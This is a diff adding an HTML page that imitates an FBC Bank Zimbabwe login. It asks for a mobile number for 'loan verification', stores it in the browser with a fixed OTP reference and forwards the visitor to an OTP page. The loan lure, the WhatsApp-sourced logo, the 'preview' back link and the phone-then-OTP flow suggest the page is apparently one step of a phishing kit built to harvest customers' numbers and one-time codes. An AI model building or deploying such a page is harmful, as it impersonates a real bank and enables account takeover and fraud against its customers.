@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FBC Bank Zimbabwe - Login</title>
+  <meta name="description" content="Please enter your mobile number to continue your FBC Bank Zimbabwe loan verification." />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --fbc-bg-blue: #0046BC;
+      --fbc-dark-blue: #003799;
+      --fbc-gold: #D4AF37;
+      --fbc-white: #FFFFFF;
+      --fbc-support-icon: #0A3C94;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: var(--fbc-bg-blue);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+      overflow-x: hidden;
+      color: var(--fbc-white);
+    }
+
+    /* Top Gold Accent Line */
+    .top-gold-line {
+      width: 100%;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, var(--fbc-gold), transparent);
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 20;
+    }
+
+    /* Bottom Decorative Wave Matching Screenshot */
+    .wave-bg {
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 100%;
+      height: 48%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .wave-svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* Main Content Wrapper */
+    .mobile-frame {
+      width: 100%;
+      max-width: 440px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 56px 28px 24px;
+      position: relative;
+      z-index: 10;
+      margin: 0 auto;
+    }
+
+    /* Round Back Button on Top Left Corner */
+    .back-circle-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.16);
+      border: 1.5px solid rgba(255, 255, 255, 0.4);
+      color: #FFFFFF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      cursor: pointer;
+      z-index: 50;
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+    }
+
+    .back-circle-btn:hover {
+      background: rgba(255, 255, 255, 0.3);
+      border-color: #FFFFFF;
+      transform: scale(1.08);
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.22);
+    }
+
+    .back-circle-btn:active {
+      transform: scale(0.95);
+    }
+
+    /* Logo Header */
+    .logo-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      margin-bottom: 24px;
+    }
+
+    .fbc-brand-lockup {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+    }
+
+    .fbc-logo-img {
+      height: 64px;
+      width: auto;
+      border-radius: 8px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+      display: block;
+    }
+
+    /* Center Form Area */
+    .form-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: auto 0;
+      padding: 10px 0;
+    }
+
+    .prompt-text {
+      font-size: 19px;
+      font-weight: 500;
+      color: #FFFFFF;
+      text-align: center;
+      margin-bottom: 34px;
+      line-height: 1.4;
+      max-width: 320px;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* Oblong Pill Input Matching Screenshot */
+    .pill-input-wrap {
+      width: 100%;
+      position: relative;
+    }
+
+    .pill-input {
+      width: 100%;
+      height: 60px;
+      background: transparent;
+      border: 1.5px solid rgba(255, 255, 255, 0.95);
+      border-radius: 9999px;
+      padding: 0 28px;
+      font-size: 17px;
+      font-weight: 500;
+      color: #FFFFFF;
+      text-align: center;
+      outline: none;
+      transition: all 0.25s ease;
+      letter-spacing: 0.5px;
+    }
+
+    .pill-input::placeholder {
+      color: rgba(255, 255, 255, 0.85);
+      font-weight: 400;
+      font-size: 17px;
+    }
+
+    .pill-input:focus {
+      border-color: #FFFFFF;
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.25), 0 0 16px rgba(255, 255, 255, 0.15);
+      background: rgba(255, 255, 255, 0.06);
+    }
+
+    /* Oblong Pill Button Matching Screenshot */
+    .pill-btn {
+      width: 100%;
+      height: 60px;
+      background: #FFFFFF;
+      border: 1px solid rgba(255, 255, 255, 0.95);
+      border-radius: 9999px;
+      color: #0045B8;
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 20px -2px rgba(0, 20, 70, 0.32), 0 2px 6px rgba(0, 0, 0, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.8);
+      transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .pill-btn:hover {
+      background: #FDFDFE;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px -4px rgba(0, 20, 70, 0.4), 0 4px 10px rgba(0, 0, 0, 0.15);
+      color: #003694;
+    }
+
+    .pill-btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 3px 10px rgba(0, 20, 70, 0.25);
+      background: #F1F5F9;
+    }
+
+    .error-notice {
+      color: #FFE4E6;
+      font-size: 13px;
+      text-align: center;
+      margin-top: -8px;
+      display: none;
+      font-weight: 600;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+
+    /* Bottom Section */
+    .bottom-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: auto;
+      padding-top: 30px;
+      z-index: 10;
+    }
+
+    .support-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      color: #0A3C94;
+      text-decoration: none;
+      cursor: pointer;
+      margin-bottom: 24px;
+      transition: transform 0.2s;
+    }
+
+    .support-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .headset-icon {
+      width: 44px;
+      height: 44px;
+      color: #0B3F9C;
+      stroke-width: 2.2;
+    }
+
+    .support-text {
+      font-size: 14px;
+      font-weight: 600;
+      color: #0B3F9C;
+      letter-spacing: 0.2px;
+    }
+
+    /* Subtle Centered Copyright */
+    .fbc-copyright {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.6);
+      text-align: center;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    /* Modal for Support */
+    .support-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-card {
+      background: white;
+      color: #0F172A;
+      border-radius: 16px;
+      padding: 26px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+    }
+
+    .modal-card h3 {
+      color: var(--fbc-bg-blue);
+      margin-bottom: 12px;
+      font-size: 18px;
+    }
+
+    .modal-card p {
+      font-size: 14px;
+      color: #64748B;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    .modal-contact-row {
+      background: #F1F5F9;
+      padding: 10px 14px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #0F172A;
+      text-align: left;
+    }
+
+    .modal-close-btn {
+      margin-top: 14px;
+      background: var(--fbc-bg-blue);
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-gold-line"></div>
+
+  <!-- Bottom Wave Graphics (SVG matching screenshot) -->
+  <div class="wave-bg">
+    <svg class="wave-svg" viewBox="0 0 500 400" preserveAspectRatio="none">
+      <path d="M 120 400 Q 200 240 340 230 Q 430 220 500 210 L 500 400 L 120 400 Z" fill="#FFFFFF"></path>
+    </svg>
+  </div>
+
+  <div class="mobile-frame">
+    
+    <!-- Round Back Button on Top Left Corner -->
+    <a href="preview.html" class="back-circle-btn" title="Back" aria-label="Go Back">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M19 12H5"/>
+        <path d="m12 19-7-7 7-7"/>
+      </svg>
+    </a>
+
+    <!-- FBC Logo at top -->
+    <header class="logo-container">
+      <div class="fbc-brand-lockup">
+        <img src="/assets/aistudio/IMG-20261106-WA0006_9fd08494.jpg" alt="FBC Logo" class="fbc-logo-img" />
+      </div>
+    </header>
+
+    <!-- Center Section -->
+    <main class="form-container">
+      <p class="prompt-text">Please enter your mobile number to continue</p>
+
+      <form class="login-form" id="loginForm" onsubmit="handleLoginSubmit(event)">
+        <div class="pill-input-wrap">
+          <input 
+            type="tel" 
+            id="mobileInput" 
+            class="pill-input" 
+            placeholder="Enter here" 
+            required 
+            autocomplete="tel" 
+          />
+        </div>
+        <div class="error-notice" id="loginError">Please enter a valid mobile number</div>
+
+        <button type="submit" class="pill-btn">Continue</button>
+      </form>
+    </main>
+
+    <!-- Bottom Section with Get Support and subtle copyright -->
+    <footer class="bottom-section">
+      <div class="support-btn" onclick="openSupportModal()">
+        <svg class="headset-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+          <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+          <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+        </svg>
+        <span class="support-text">Get Support</span>
+      </div>
+
+      <div class="fbc-copyright">
+        © FBC BANK ZIMBABWE. All rights reserved.
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- Support Modal -->
+  <div class="support-modal" id="supportModal">
+    <div class="modal-card">
+      <h3>FBC Bank Client Support</h3>
+      <p>Need assistance with your loan verification or mobile banking access?</p>
+      
+      <div class="modal-contact-row">📞 Toll Free: 0800 4224 / 0800 4225</div>
+      <div class="modal-contact-row">📱 WhatsApp: +263 772 419 693</div>
+      <div class="modal-contact-row">✉️ Email: help@fbc.co.zw</div>
+      <div class="modal-contact-row">🏢 Head Office: 76 Samora Machel Ave, Harare</div>
+
+      <button type="button" class="modal-close-btn" onclick="closeSupportModal()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedPhone = localStorage.getItem('fbc_phone_number');
+      if (savedPhone) {
+        document.getElementById('mobileInput').value = savedPhone;
+      }
+    });
+
+    function handleLoginSubmit(e) {
+      e.preventDefault();
+      const mobileVal = document.getElementById('mobileInput').value.trim();
+
+      if (!mobileVal || mobileVal.length < 8) {
+        document.getElementById('loginError').style.display = 'block';
+        return;
+      }
+
+      document.getElementById('loginError').style.display = 'none';
+
+      localStorage.setItem('fbc_phone_number', mobileVal);
+      localStorage.setItem('fbc_login_phone', mobileVal);
+      localStorage.setItem('fbc_otp_ref', '9vXfk');
+
+      window.location.href = 'otp.html';
+    }
+
+    function openSupportModal() {
+      document.getElementById('supportModal').style.display = 'flex';
+    }
+
+    function closeSupportModal() {
+      document.getElementById('supportModal').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
